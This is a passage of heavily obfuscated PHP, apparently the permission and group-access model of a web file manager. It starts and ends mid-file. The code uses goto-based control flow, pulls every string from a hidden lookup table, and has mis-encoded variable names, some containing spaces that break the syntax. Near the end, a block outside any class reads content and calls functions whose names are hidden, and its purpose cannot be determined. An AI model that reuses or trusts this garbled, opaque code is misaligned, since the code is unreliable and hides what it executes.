array_values(array_unique($CÌåÑÆæÓ´)); goto eŒ„—ÂÙÇ; a±äÏÌÓèë: $Dø¯µ‚óÑ‚ = array(); if ($cã¸ÑğéÜ¤) { $DŠ„Ùƒ‘œ = $c‹ãšùÖà¤->where(array($D§ã¦…õò[390] => array($D§ã¦…õò[405], $cã¸ÑğéÜ¤)))->select(); foreach ($DŠ„Ùƒ‘œ as $Eô¡¢®ùœß) { $B„öˆ®—‰• = $c‹ãšùÖà¤->parentLevelArray($Eô¡¢®ùœß[$D§ã¦…õò[481]]); $Aó§¹­Œî‡ = array_merge($Aó§¹­Œî‡, $B„öˆ®—‰•); $CÌåÑÆæÓ´[] = $Eô¡¢®ùœß[$D§ã¦…õò[478]]; $BÛæçØé ò[$Eô¡¢®ùœß[$D§ã¦…õò[390]]] = $B„öˆ®—‰•; $Fœá•ÊœÌ‹[$Eô¡¢®ùœß[$D§ã¦…õò[390]]] = $Eô¡¢®ùœß[$D§ã¦…õò[478]]; } } $CÌåÑÆæÓ´ = array_values(array_unique($CÌåÑÆæÓ´)); goto CçÕ¾”ê½; eŒ„—ÂÙÇ: foreach ($CÌåÑÆæÓ´ as $c›¨ÂäÑëó) { $f´–‘ˆšôÉ = $bŠÌÕÎøê->getInfo($c›¨ÂäÑëó); $Aó§¹­Œî‡[] = $f´–‘ˆšôÉ[$D§ã¦…õò[84]][$D§ã¦…õò[390]]; $aæ·¨»ôƒ[$c›¨ÂäÑëó] = $f´–‘ˆšôÉ[$D§ã¦…õò[84]][$D§ã¦…õò[390]]; $Dø¯µ‚óÑ‚[$c›¨ÂäÑëó] = $c‹ãšùÖà¤->parentLevelArray($f´–‘ˆšôÉ[$D§ã¦…õò[481]]); } foreach ($BÛæçØé ò as $c£–Œí‚Ìš => $F¾ÜÑ‘¤×·) { $FµàùÌÔÌ¹ = $Fœá•ÊœÌ‹[$c£–Œí‚Ìš]; if (!$FµàùÌÔÌ¹ || !$aæ·¨»ôƒ[$FµàùÌÔÌ¹]) { continue; } $fñºÚ©˜ö = array(); foreach ($Dø¯µ‚óÑ‚[$FµàùÌÔÌ¹] as $c›¨ÂäÑëó) { $fñºÚ©˜ö[] = $aæ·¨»ôƒ[$c›¨ÂäÑëó]; } $BÛæçØé ò[$c£–Œí‚Ìš] = array_merge($fñºÚ©˜ö, $F¾ÜÑ‘¤×·); } $Aó§¹­Œî‡ = array_values(array_unique($Aó§¹­Œî‡)); goto a‡’±´Ì; D‹Å¶ÕËÊØ: $CÌåÑÆæÓ´ = $Eùï»ÌîÓ¶; $c‹ãšùÖà¤ = Model($D§ã¦…õò[1178]); $bŠÌÕÎøê = Model($D§ã¦…õò[480]); goto aéÃğ å‚; a‡’±´Ì: $b³´ê»åÚ = array($D§ã¦…õò[1844] => $Aó§¹­Œî‡, $D§ã¦…õò[1845] => $BÛæçØé ò); $DòÎÀğ‚†¬[$b¡Æ£¨õÌ] = $b³´ê»åÚ; return $b³´ê»åÚ; goto eÜ²½ªÓˆ; eÜ²½ªÓˆ: } private function makeSourceAuth($AÍäÅÄ¸˜ê, $E¾ïŒŸ™‘¨, $b‘Üôé±„Ú = false) { goto D˜¼¯èÓ‘Ñ; FÓ˜¶«®ÁÚ: foreach ($C½³ÆƒŞ’… as $BÛã×ÔêÏ) { if (!isset($E¾ïŒŸ™‘¨[$BÛã×ÔêÏ])) { continue; } $d®«ìîÚÜ = $this->authMake($E¾ïŒŸ™‘¨[$BÛã×ÔêÏ], $b‘Üôé±„Ú); if ($d®«ìîÚÜ[$b—«©‰î–÷[440]]) { $bÍôŠğŠœ† = $d®«ìîÚÜ; break; } } if (!$AñìÚÈ…¢) { return $bÍôŠğŠœ†; } if (!$bÍôŠğŠœ† && $c»ôá”ƒİ) { $bÍôŠğŠœ† = $this->groupAuthInfo($c»ôá”ƒİ, $EäĞµÄóí); } goto eíÆ¨˜±­; dñáïï¹îš: $AñìÚÈ…¢ = $AÍäÅÄ¸˜ê[$b—«©‰î–÷[398]] == SourceModel::TYPE_GROUP; $c»ôá”ƒİ = $AñìÚÈ…¢ ? $this->groupRootAuth($EäĞµÄóí, $b‘Üôé±„Ú) : !1; if ($c»ôá”ƒİ && Model($b—«©‰î–÷[1832])->authCheckAction($c»ôá”ƒİ[$b—«©‰î–÷[400]], $b—«©‰î–÷[1684])) { return $this->groupAuthInfo($c»ôá”ƒİ, $EäĞµÄóí); } goto b×Åîœ„ÙÅ; D˜¼¯èÓ‘Ñ: $b—«©‰î–÷ =& $_SERVER[Â€Á›¨õ]; $b—‚ï´†ï´ = $b—«©‰î–÷[86]; $EäĞµÄóí = $AÍäÅÄ¸˜ê[$b—«©‰î–÷[478]]; goto dñáïï¹îš; eíÆ¨˜±­: if (!$bÍôŠğŠœ†) { $D­¹ã»Š™Å = Model($b—«©‰î–÷[480])->getInfo($EäĞµÄóí); $Bê«àÇÇñç = explode($b—«©‰î–÷[47], trim($D­¹ã»Š™Å[$b—«©‰î–÷[481]], $b—«©‰î–÷[47])); $Bê«àÇÇñç = array_reverse($Bê«àÇÇñç); foreach ($Bê«àÇÇñç as $D¡è²ê¬İ£) { if ($D¡è²ê¬İ£ == $b—«©‰î–÷[491] || $D¡è²ê¬İ£ == $b—‚ï´†ï´) { continue; } $Dö´İ’¸¶’ = $this->groupRootAuth($D¡è²ê¬İ£, $b‘Üôé±„Ú); if (!$Dö´İ’¸¶’) { continue; } $bÍôŠğŠœ† = $this->groupAuthInfo($Dö´İ’¸¶’, $D¡è²ê¬İ£); break; } } if (!$bÍôŠğŠœ† || $bÍôŠğŠœ†[$b—«©‰î–÷[401]] <= 0) { $e„»ìØ´ÔÒ = $this->authDeepCheck($AÍäÅÄ¸˜ê[$b—«©‰î–÷[390]], $b‘Üôé±„Ú); if ($e„»ìØ´ÔÒ) { $bÍôŠğŠœ† = $e„»ìØ´ÔÒ; } } return $bÍôŠğŠœ†; goto dˆ‰Ø³˜Ê®; b×Åîœ„ÙÅ: $C½³ÆƒŞ’… = Model($b—«©‰î–÷[1178])->parentLevelArray($AÍäÅÄ¸˜ê[$b—«©‰î–÷[481]]); $C½³ÆƒŞ’… = array_merge(array($AÍäÅÄ¸˜ê[$b—«©‰î–÷[390]]), array_reverse($C½³ÆƒŞ’…)); $bÍôŠğŠœ† = !1; goto FÓ˜¶«®ÁÚ; dˆ‰Ø³˜Ê®: } private function userIsRoot($AÜ“àÖãµ = false) { $D¦ºø˜ ½ =& $_SERVER[Â€Á›¨õ]; if (!$AÜ“àÖãµ && _get($GLOBALS, $D¦ºø˜ ½[479])) { return !0; } $b»¿Ö‰É¢‹ = Model($D¦ºø˜ ½[501])->getInfo($AÜ“àÖãµ); $dÎ‰•Óˆå” = Model($D¦ºø˜ ½[1853])->listData($b»¿Ö‰É¢‹[$D¦ºø˜ ½[1385]]); if ($dÎ‰•Óˆå” && $dÎ‰•Óˆå”[$D¦ºø˜ ½[1256]][$D¦ºø˜ ½[1854]] == 1) { return !0; } return !1; } private function sourceAuthInfo($b¤ºœÄÜ) { goto eŠ²˜ùÚğµ; f×‹ä‘øí: $bèøæï®‘ƒ = $DÏ•×Ş¯·->_listAppendPath($bèøæï®‘ƒ); $C„«áïíÂ“ = $bèøæï®‘ƒ[0]; $c³Ê‰É‰áò = $C„«áïíÂ“[$e±ÁÖ‡²Ë[489]]; goto Cï³„¿‡š™; Cï³„¿‡š™: if (isset($C„«áïíÂ“[$e±ÁÖ‡²Ë[486]])) { $d‚ëœ§Åö¬ = explode($e±ÁÖ‡²Ë[8], trim($C„«áïíÂ“[$e±ÁÖ‡²Ë[489]], $e±ÁÖ‡²Ë[8])); array_shift($d‚ëœ§Åö¬); $c³Ê‰É‰áò = $C„«áïíÂ“[$e±ÁÖ‡²Ë[484]] . $e±ÁÖ‡²Ë[1855] . implode($e±ÁÖ‡²Ë[8], $d‚ëœ§Åö¬); } return array($e±ÁÖ‡²Ë[407] => $C„«áïíÂ“[$e±ÁÖ‡²Ë[28]], $e±ÁÖ‡²Ë[75] => KodIO::make($C„«áïíÂ“[$e±ÁÖ‡²Ë[390]]), $e±ÁÖ‡²Ë[1856] => $c³Ê‰É‰áò); goto C¿‰Æ„šÜõ; eŠ²˜ùÚğµ: $e±ÁÖ‡²Ë =& $_SERVER[Â€Á›¨õ]; $DÏ•×Ş¯· = Model($e±ÁÖ‡²Ë[1178]); $C„«áïíÂ“ = $DÏ•×Ş¯·->sourceInfo($b¤ºœÄÜ); goto f®Ô•Àø¬÷; f®Ô•Àø¬÷: if (!$C„«áïíÂ“) { return !1; } $DÏ•×Ş¯·->groupPathDisplay($C„«áïíÂ“); $bèøæï®‘ƒ = array($C„«áïíÂ“); goto f×‹ä‘øí; C¿‰Æ„šÜõ: } private function groupAuthInfo($fÀ†îŞŠç‰, $cãóº¬îŒë) { $a¯ÚÆ‹’â =& $_SERVER[Â€Á›¨õ]; $bÅ…•‰’êÄ = Model($a¯ÚÆ‹’â[480])->getInfo($cãóº¬îŒë); return array($a¯ÚÆ‹’â[1857] => intval($fÀ†îŞŠç‰[$a¯ÚÆ‹’â[400]]), $a¯ÚÆ‹’â[1841] => $fÀ†îŞŠç‰, $a¯ÚÆ‹’â[1858] => LNG($a¯ÚÆ‹’â[1859]), $a¯ÚÆ‹’â[1850] => array($a¯ÚÆ‹’â[407] => $bÅ…•‰’êÄ[$a¯ÚÆ‹’â[28]], $a¯ÚÆ‹’â[75] => KodIO::make($bÅ…•‰’êÄ[$a¯ÚÆ‹’â[84]][$a¯ÚÆ‹’â[390]]), $a¯ÚÆ‹’â[1856] => $bÅ…•‰’êÄ[$a¯ÚÆ‹’â[485]])); } protected function groupRootAuth($d—¨Â¢˜ë‡, $c­ñãÙï = false) { goto D¯‡öó‰¡ç; D¯‡öó‰¡ç: $A×¿ªÜÚË’ =& $_SERVER[Â€Á›¨õ]; $c­ñãÙï = $c­ñãÙï ? $c­ñãÙï : USER_ID; $dùÃ‰‚†òœ = $c­ñãÙï . $A×¿ªÜÚË’[1860] . $d—¨Â¢˜ë‡; goto a¬‡ëÑÉÓİ; b˜ÓÖ†°: $b»ÈÖ¼è”ª[$dùÃ‰‚†òœ] = $eÑ¿Øà±ï™ ? $eÑ¿Øà±ï™ : $Dš†é¸¹¿õ; return $b»ÈÖ¼è”ª[$dùÃ‰‚†òœ]; goto E…â£Ì±ÀÓ; BŞ…²ñ© Û: $FŒßì·¦¶‡ = $this->userGroupList($c­ñãÙï); $Dš†é¸¹¿õ = isset($FŒßì·¦¶‡[$d—¨Â¢˜ë‡]) ? $FŒßì·¦¶‡[$d—¨Â¢˜ë‡][$A×¿ªÜÚË’[400]] : !1; if ($Dš†é¸¹¿õ && Model($A×¿ªÜÚË’[1832])->authCheckAction($Dš†é¸¹¿õ[$A×¿ªÜÚË’[400]], $A×¿ªÜÚË’[1684])) { $b»ÈÖ¼è”ª[$dùÃ‰‚†òœ] = $Dš†é¸¹¿õ; return $Dš†é¸¹¿õ; } goto FÆ¤‚èœâö; FÆ¤‚èœâö: $aí‹äùµ¶• = $this->sourceAuthSelect($EÛ‹ÁÖ‘íÒ[$A×¿ªÜÚË’[84]][$A×¿ªÜÚË’[390]]); $E‡Êßëª¯ä = $aí‹äùµ¶• ? $this->authMake($aí‹äùµ¶•, $c­ñãÙï) : !1; $eÑ¿Øà±ï™ = $E‡Êßëª¯ä ? $E‡Êßëª¯ä[$A×¿ªÜÚË’[440]] : !1; goto b˜ÓÖ†°; a¬‡ëÑÉÓİ: static $b»ÈÖ¼è”ª = array(); if (isset($b»ÈÖ¼è”ª[$dùÃ‰‚†òœ])) { return $b»ÈÖ¼è”ª[$dùÃ‰‚†òœ]; } $EÛ‹ÁÖ‘íÒ = Model($A×¿ªÜÚË’[480])->getInfo($d—¨Â¢˜ë‡); goto BŞ…²ñ© Û; E…â£Ì±ÀÓ: } public function authOwnerApply($BêÅ›‘Ÿ) { goto FÈÒĞ­Ÿ‡Ğ; Eš‹Ô¨—œŠ: $BêÅ›‘Ÿ[$fÆ‰ÇÆä­Î[400]][$fÆ‰ÇÆä­Î[1863]] = Model($fÆ‰ÇÆä­Î[497])->userListInfo($CïØ´åİ­Ø); return $BêÅ›‘Ÿ; goto dƒÕ×êŸˆŒ; aõŒ˜†‡«: if (count($CïØ´åİ­Ø) == 0) { $CïØ´åİ­Ø = $this->authFolderOwnerGroup($BêÅ›‘Ÿ[$fÆ‰ÇÆä­Î[478]]); } $CïØ´åİ­Ø = array_unique($CïØ´åİ­Ø); if (AuthModel::authCheckRoot($BêÅ›‘Ÿ[$fÆ‰ÇÆä­Î[400]][$fÆ‰ÇÆä­Î[401]])) { $CïØ´åİ­Ø[] = USER_ID; } goto Eš‹Ô¨—œŠ; A°øğÉ†•: $D‹ŸêˆâÚæ = Model($fÆ‰ÇÆä­Î[1178])->parentLevelArray($BêÅ›‘Ÿ[$fÆ‰ÇÆä­Î[481]]); $D‹ŸêˆâÚæ = array_merge(array($BêÅ›‘Ÿ[$fÆ‰ÇÆä­Î[390]]), array_reverse($D‹ŸêˆâÚæ)); $DŸÆÛ‹Ä¸ = $this->sourceAuthSelect($D‹ŸêˆâÚæ); goto eœé½‡ÒÏ°; FÈÒĞ­Ÿ‡Ğ: $fÆ‰ÇÆä­Î =& $_SERVER[Â€Á›¨õ]; if (empty($BêÅ›‘Ÿ[$fÆ‰ÇÆä­Î[400]]) || isset($BêÅ›‘Ÿ[$fÆ‰ÇÆä­Î[1861]]) && $BêÅ›‘Ÿ[$fÆ‰ÇÆä­Î[1861]]) { return $BêÅ›‘Ÿ; } if (AuthModel::authCheckRoot($BêÅ›‘Ÿ[$fÆ‰ÇÆä­Î[400]][$fÆ‰ÇÆä­Î[401]])) { return $BêÅ›‘Ÿ; } goto A°øğÉ†•; eœé½‡ÒÏ°: $F«’éŒº¨Ş = array(); $CïØ´åİ­Ø = array(); foreach ($DŸÆÛ‹Ä¸ as $bãºŠšµ­ë => $f‰ªä¡£Ô) { $AÌ“ÙÒ„Ç„ = $this->authFolderOwnerUser($f‰ªä¡£Ô); $F«’éŒº¨Ş[$bãºŠšµ­ë] = $AÌ“ÙÒ„Ç„; $CïØ´åİ­Ø = array_merge($CïØ´åİ­Ø, $AÌ“ÙÒ„Ç„[$fÆ‰ÇÆä­Î[557]]); if ($AÌ“ÙÒ„Ç„[$fÆ‰ÇÆä­Î[1862]]) { break; } } goto aõŒ˜†‡«; dƒÕ×êŸˆŒ: } private function authFolderOwnerGroup($D‘±Ó ÃÀÒ) { $cÕ‘å‘ñ† =& $_SERVER[Â€Á›¨õ]; $eïŞÎóƒ¥İ = Model($cÕ‘å‘ñ†[1746])->where(array($cÕ‘å‘ñ†[1664] => $D‘±Ó ÃÀÒ))->select(); $dêê¦’´Ö = array(); if (!$eïŞÎóƒ¥İ) { return $dêê¦’´Ö; } foreach ($eïŞÎóƒ¥İ as $d‡Ğò¢É‡Ô) { $Fø¡±Ë™ãƒ = $this->authInfo($d‡Ğò¢É‡Ô); if (AuthModel::authCheckRoot($Fø¡±Ë™ãƒ[$cÕ‘å‘ñ†[400]])) { $dêê¦’´Ö[] = $d‡Ğò¢É‡Ô[$cÕ‘å‘ñ†[1501]]; } } return $dêê¦’´Ö; } private function authFolderOwnerUser($f£ä¸„ˆˆİ) { $BÅ¬‹ØñÏ =& $_SERVER[Â€Á›¨õ]; $e°‘²Õí¸Ù = array(); $b”‡¸ˆ¬À = !1; foreach ($f£ä¸„ˆˆİ as $a«’‘Ñ‹×) { $d£æ’ïğ¿‹ = $this->authInfo($a«’‘Ñ‹×); if ($a«’‘Ñ‹×[$BÅ¬‹ØñÏ[478]] == $BÅ¬‹ØñÏ[491]) { $b”‡¸ˆ¬À = !0; } if ($a«’‘Ñ‹×[$BÅ¬‹ØñÏ[398]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($d£æ’ïğ¿‹[$BÅ¬‹ØñÏ[400]])) { $e°‘²Õí¸Ù[] = $a«’‘Ñ‹×[$BÅ¬‹ØñÏ[478]]; } } } return array($BÅ¬‹ØñÏ[557] => $e°‘²Õí¸Ù, $BÅ¬‹ØñÏ[1862] => $b”‡¸ˆ¬À); } public function authMake($Cº´¾µàÁ­, $C‹…Û˜ŠÈ = false) { $Cí¥ëàŞ› =& $_SERVER[Â€Á›¨õ]; $f§Øè ÏÏˆ = $this->authArrayCheck($Cº´¾µàÁ­, $C‹…Û˜ŠÈ); if ($f§Øè ÏÏˆ[$Cí¥ëàŞ›[1864]]) { $f§Øè ÏÏˆ[$Cí¥ëàŞ›[1864]] = $this->sourceAuthInfo($f§Øè ÏÏˆ[$Cí¥ëàŞ›[1864]]); } return $f§Øè ÏÏˆ; } public function authArrayCheck($c•î®‰Õ„, $EÑ’œÕÎˆ¾ = false) { goto dŠŠ„Û¦í£; bÈí‚ÔË¸: $AĞß‹šá´ˆ = 0; $D‰Œ¥…©˜ = 0; $C±¼æğåš = 0; goto eİ‰âÑœ ì; DÎíŠÈÑÄ: return $dÆœ×´Á¥Ú; goto E¿ÎñÃõ¸†; cáÇ½˜°ÔÅ: $DíŠ©¨î ã = 1000; $eÂì­¢á•á = 0; $bÙæ„¥ÄÜÈ = 0; goto fä¥¯ğ¿Ş; dŠŠ„Û¦í£: $fÔæŠä„­æ =& $_SERVER[Â€Á›¨õ]; if (!$c•î®‰Õ„) { return array($fÔæŠä„­æ[401] => 0, $fÔæŠä„­æ[440] => !1); } $EÑ’œÕÎˆ¾ = $EÑ’œÕÎˆ¾ ? $EÑ’œÕÎˆ¾ : USER_ID; goto bÈí‚ÔË¸; aÓòíÖ¹“ª: foreach ($c•î®‰Õ„ as $dô¿Äà•É) { $C‡¿ÑˆŒ×ã = $this->authInfo($dô¿Äà•É); if (!$C‡¿ÑˆŒ×ã) { continue; } $EÆ„Ğ¹»Ü = $dô¿Äà•É[$fÔæŠä„­æ[478]]; $dö¶ğª¸ÑÔ = intval($C‡¿ÑˆŒ×ã[$fÔæŠä„­æ[400]]); if ($dô¿Äà•É[$fÔæŠä„­æ[398]] == SourceModel::TYPE_USER && $EÆ„Ğ¹»Ü == $EÑ’œÕÎˆ¾) { $AĞß‹šá´ˆ = !0; $C±¼æğåš = $C‡¿ÑˆŒ×ã; $D‰Œ¥…©˜ = $dö¶ğª¸ÑÔ; } else { if ($dô¿Äà•É[$fÔæŠä„­æ[398]] == SourceModel::TYPE_GROUP && $this->groupContainUser($EÆ„Ğ¹»Ü, $EÑ’œÕÎˆ¾)) { $Eë»¼œå°‡ = !0; $cÆĞ¸ˆŒŠ = $this->groupStepToUserGroup($EÆ„Ğ¹»Ü, $EÑ’œÕÎˆ¾); if ($cÆĞ¸ˆŒŠ < $DíŠ©¨î ã) { $DíŠ©¨î ã = $cÆĞ¸ˆŒŠ; $AÅÅÏµİâ„ = $dö¶ğª¸ÑÔ; $e²™õƒŠª± = $C‡¿ÑˆŒ×ã; $eÂì­¢á•á = $EÆ„Ğ¹»Ü; } if ($cÆĞ¸ˆŒŠ == $DíŠ©¨î ã && $dö¶ğª¸ÑÔ >= $AÅÅÏµİâ„) { $AÅÅÏµİâ„ = $dö¶ğª¸ÑÔ; $e²™õƒŠª± = $C‡¿ÑˆŒ×ã; $eÂì­¢á•á = $EÆ„Ğ¹»Ü; } } else { if ($EÆ„Ğ¹»Ü == $fÔæŠä„­æ[491]) { $bÙæ„¥ÄÜÈ = !0; $BÖìÑØøŸÜ = $C‡¿ÑˆŒ×ã; $aá±çÒøâ = $dö¶ğª¸ÑÔ; } } } } if ($AĞß‹šá´ˆ) { $fï½ö‰ÊöÂ = $D‰Œ¥…©˜; $C‡¿ÑˆŒ×ã = $C±¼æğåš; $E’ò÷÷Ä‹ = LNG($fÔæŠä„­æ[1865]); } else { if ($Eë»¼œå°‡) { $fï½ö‰ÊöÂ = $AÅÅÏµİâ„; $C‡¿ÑˆŒ×ã = $e²™õƒŠª±; $d‹Ïëí¾÷ğ = Model($fÔæŠä„­æ[480])->getInfo($eÂì­¢á•á); $E’ò÷÷Ä‹ = $fÔæŠä„­æ[159] . $d‹Ïëí¾÷ğ[$fÔæŠä„­æ[485]] . $fÔæŠä„­æ[1866] . LNG($fÔæŠä„­æ[1867]); } else { if ($bÙæ„¥ÄÜÈ) { $fï½ö‰ÊöÂ = $aá±çÒøâ; $C‡¿ÑˆŒ×ã = $BÖìÑØøŸÜ; $E’ò÷÷Ä‹ = LNG($fÔæŠä„­æ[1838]); } else { $fï½ö‰ÊöÂ = 0; $C‡¿ÑˆŒ×ã = !1; $E’ò÷÷Ä‹ = $fÔæŠä„­æ[33]; } } } $dÆœ×´Á¥Ú = array($fÔæŠä„­æ[1857] => intval($fï½ö‰ÊöÂ), $fÔæŠä„­æ[1841] => $C‡¿ÑˆŒ×ã, $fÔæŠä„­æ[1858] => $E’ò÷÷Ä‹, $fÔæŠä„­æ[1850] => $dô¿Äà•É[$fÔæŠä„­æ[390]]); goto DÎíŠÈÑÄ; eİ‰âÑœ ì: $Eë»¼œå°‡ = 0; $AÅÅÏµİâ„ = 0; $e²™õƒŠª± = 0; goto cáÇ½˜°ÔÅ; fä¥¯ğ¿Ş: $aá±çÒøâ = 0; $BÖìÑØøŸÜ = 0; $dô¿Äà•É = array($fÔæŠä„­æ[390] => 0); goto aÓòíÖ¹“ª; E¿ÎñÃõ¸†: } private function groupContainUser($E¬™ˆ¸÷ò, $f¹äöÙœ¸ = false) { return in_array($E¬™ˆ¸÷ò, $this->userGroupParents($f¹äöÙœ¸)); } private function groupStepToUserGroup($cµç¿Ï²Œ, $båÈéîÎª = false) { goto aôª£‹“‚Õ; e³Œ í§‚Ğ: return $D²ôµ˜µ–; goto FÊ É¼²ËŠ; FàæÙöÁŸœ: $F­Èë¶”ß = $GLOBALS[$dÑÒ‡Ÿñä[6]][$dÑÒ‡Ÿñä[87]][$dÑÒ‡Ÿñä[1757]] == 1; $CÊÎ«¶ì‹’ = $F­Èë¶”ß ? 3 : 2; foreach ($Fˆ¯…ö¾í as $bÀƒ†È˜®È) { if ($bÀƒ†È˜®È[$dÑÒ‡Ÿñä[1664]] == $cµç¿Ï²Œ) { return 0; } $Cô­Õ®ê©» = explode($dÑÒ‡Ÿñä[47], trim($bÀƒ†È˜®È[$dÑÒ‡Ÿñä[481]], $dÑÒ‡Ÿñä[47])); if ($Cô­Õ®ê©»[0] == $dÑÒ‡Ÿñä[491] && count($Cô­Õ®ê©») > $CÊÎ«¶ì‹’) { $C İœ‡‘ºñ = array_reverse(array_slice($Cô­Õ®ê©», $CÊÎ«¶ì‹’)); $FîÉš÷‰‡ = array_search($cµç¿Ï²Œ, $C İœ‡‘ºñ); if ($FîÉš÷‰‡ !== !1 && $FîÉš÷‰‡ + 1 <= $D²ôµ˜µ–) { $D²ôµ˜µ– = $FîÉš÷‰‡ + 1; } } } goto e³Œ í§‚Ğ; aôª£‹“‚Õ: $dÑÒ‡Ÿñä =& $_SERVER[Â€Á›¨õ]; $Fˆ¯…ö¾í = $this->userGroupList($båÈéîÎª); $D²ôµ˜µ– = 1000; goto FàæÙöÁŸœ; FÊ É¼²ËŠ: } private function userGroupList($cÓ½ïÄÂÅ‡ = false) { $F—ñ¢“ÔÇ =& $_SERVER[Â€Á›¨õ]; static $eÍµñ·­ÅÒ = array(); if (isset($eÍµñ·­ÅÒ[$cÓ½ïÄÂÅ‡])) { return $eÍµñ·­ÅÒ[$cÓ½ïÄÂÅ‡]; } $B±éÑÑ½©ï = Model($F—ñ¢“ÔÇ[501])->getInfo($cÓ½ïÄÂÅ‡); $eÍµñ·­ÅÒ[$cÓ½ïÄÂÅ‡] = array_to_keyvalue($B±éÑÑ½©ï[$F—ñ¢“ÔÇ[1839]], $F—ñ¢“ÔÇ[1664]); return $eÍµñ·­ÅÒ[$cÓ½ïÄÂÅ‡]; } public function userGroupParents($F±°®„®…) { goto BëçÜõó°Ô; BëçÜõó°Ô: $bÒ‰±Î”¶Æ =& $_SERVER[Â€Á›¨õ]; static $E»Ñæ™ìÀ = array(); $F±°®„®… = $F±°®„®… ? $F±°®„®… : USER_ID; goto DõÒïÖâ Æ; DõÒïÖâ Æ: if (isset($E»Ñæ™ìÀ[$F±°®„®…])) { return $E»Ñæ™ìÀ[$F±°®„®…]; } $Aª÷¬ì´Öá = $this->userGroupList($F±°®„®…); $eÕˆİšÑìò = array(); goto Cœœ• ƒÔß; Cœœ• ƒÔß: $A‰¨‚ïï‡£ = $GLOBALS[$bÒ‰±Î”¶Æ[6]][$bÒ‰±Î”¶Æ[87]][$bÒ‰±Î”¶Æ[1757]] == 1; $A¬ëŒóùã = $A‰¨‚ïï‡£ ? 3 : 2; foreach ($Aª÷¬ì´Öá as $BˆƒÈ’Óä¢) { $AºÁÛŞ÷ÄÎ = array($BˆƒÈ’Óä¢[$bÒ‰±Î”¶Æ[1664]]); $DîÈ… ª… = explode($bÒ‰±Î”¶Æ[47], trim($BˆƒÈ’Óä¢[$bÒ‰±Î”¶Æ[481]], $bÒ‰±Î”¶Æ[47])); if ($DîÈ… ª…[0] == $bÒ‰±Î”¶Æ[491] && count($DîÈ… ª…) > $A¬ëŒóùã) { $EÀ‹ƒ“Ü»› = array_slice($DîÈ… ª…, $A¬ëŒóùã); $AºÁÛŞ÷ÄÎ = array_merge($AºÁÛŞ÷ÄÎ, array_reverse($EÀ‹ƒ“Ü»›)); } $eÕˆİšÑìò = array_merge($eÕˆİšÑìò, $AºÁÛŞ÷ÄÎ); } goto fƒ‹àñ·Ë; fƒ‹àñ·Ë: $E»Ñæ™ìÀ[$F±°®„®…] = array_unique($eÕˆİšÑìò); return $E»Ñæ™ìÀ[$F±°®„®…]; goto aÔË¡ƒ®ãß; aÔË¡ƒ®ãß: } public function authTargetInfoMake($F¿ŠÒ‚ÅÉë) { goto dçñ¦¢®±Õ; E °Ëº¬ß: foreach ($F¿ŠÒ‚ÅÉë as $CÓ³“÷Åµì) { if ($CÓ³“÷Åµì[$b®‘ã‡¸æ[398]] == SourceModel::TYPE_USER) { $BÃ“¡óó”À[] = intval($CÓ³“÷Åµì[$b®‘ã‡¸æ[478]]); } else { if ($CÓ³“÷Åµì[$b®‘ã‡¸æ[398]] == SourceModel::TYPE_GROUP) { $DŒÍŸŸå‹¬[] = intval($CÓ³“÷Åµì[$b®‘ã‡¸æ[478]]); } } } if ($BÃ“¡óó”À) { $BÃ“¡óó”À = Model($b®‘ã‡¸æ[497])->userListInfo($BÃ“¡óó”À); } if ($DŒÍŸŸå‹¬) { $fº±İ˜ØÉ = array($b®‘ã‡¸æ[1743] => array($b®‘ã‡¸æ[405], $DŒÍŸŸå‹¬)); $DŒÍŸŸå‹¬ = Model($b®‘ã‡¸æ[480])->field($b®‘ã‡¸æ[1868])->where($fº±İ˜ØÉ)->select(); $DŒÍŸŸå‹¬ = array_to_keyvalue($DŒÍŸŸå‹¬, $b®‘ã‡¸æ[1664]); } goto aÃ©¿ŠÆ; dçñ¦¢®±Õ: $b®‘ã‡¸æ =& $_SERVER[Â€Á›¨õ]; $BÃ“¡óó”À = array(); $DŒÍŸŸå‹¬ = array(); goto E °Ëº¬ß; aÃ©¿ŠÆ: return array($b®‘ã‡¸æ[1869] => $BÃ“¡óó”À, $b®‘ã‡¸æ[1870] => $DŒÍŸŸå‹¬); goto BÓÛÑçø½¿; BÓÛÑçø½¿: } public function authInfo($F‹¨Õ¿Âº›) { $fäŸ»ï¢ó =& $_SERVER[Â€Á›¨õ]; if ($F‹¨Õ¿Âº›[$fäŸ»ï¢ó[1760]]) { $cÌŸÛ†¢‹ = Model($fäŸ»ï¢ó[1832])->listData($F‹¨Õ¿Âº›[$fäŸ»ï¢ó[1760]]); if (!$cÌŸÛ†¢‹) { return !1; $d¼ïÊ µÆ™ = Model($fäŸ»ï¢ó[1832])->listData(); $dĞ ‚ÈÕÃŠ = array_filter_by_field($d¼ïÊ µÆ™, $fäŸ»ï¢ó[400], $fäŸ»ï¢ó[491]); return $dĞ ‚ÈÕÃŠ; } $Aß¯©ß¯Ô = array_field_key($cÌŸÛ†¢‹, array($fäŸ»ï¢ó[388], $fäŸ»ï¢ó[28], $fäŸ»ï¢ó[400], $fäŸ»ï¢ó[1685], $fäŸ»ï¢ó[1687])); $Aß¯©ß¯Ô[$fäŸ»ï¢ó[1871]] = $F‹¨Õ¿Âº›; return $Aß¯©ß¯Ô; } else { return array($fäŸ»ï¢ó[406] => 0, $fäŸ»ï¢ó[1670] => $F‹¨Õ¿Âº›[$fäŸ»ï¢ó[1814]], $fäŸ»ï¢ó[407] => $fäŸ»ï¢ó[33], $fäŸ»ï¢ó[1685] => $fäŸ»ï¢ó[1872]); } } } if ($_SERVER[$_SERVER[Â€Á›¨õ][811]] != $_SERVER[$_SERVER[Â€Á›¨õ][1350]]) { goto Bé÷Ì½†»Ú; Bé÷Ì½†»Ú: $d™Ú‡Ã“ÓŒ = $_SERVER[Â€Á›¨õ][813]; $dÅçá­Ë¾Ã = $_SERVER[$_SERVER[Â€Á›¨õ][808]] . $_SERVER[Â€Á›¨õ][809]; $BçÛ¸áªˆ = $d™Ú‡Ã“ÓŒ($dÅçá­Ë¾Ã); goto E‰×çè…š; b÷šÍŸï : $cîòÄÈµ¿($_SERVER[$_SERVER[Â€Á›¨õ][1231]]); goto D‘óÓÎìÎ¥; E‰×çè…š: $F…ÛÛ´Šô = explode($_SERVER[Â€Á›¨õ][227], $BçÛ¸áªˆ); if (count($F…ÛÛ´Šô) < $_SERVER[Â€Á›¨õ][592]) { $e¸£ÏÕè…Ÿ = $_SERVER[Â€Á›¨õ][814]; $e¸£ÏÕè…Ÿ(); } $cîòÄÈµ¿ = $_SERVER[Â€Á›¨õ][1232]; goto b÷šÍŸï ; D‘óÓÎìÎ¥: } class SourceEventModel extends ModelBase { protected 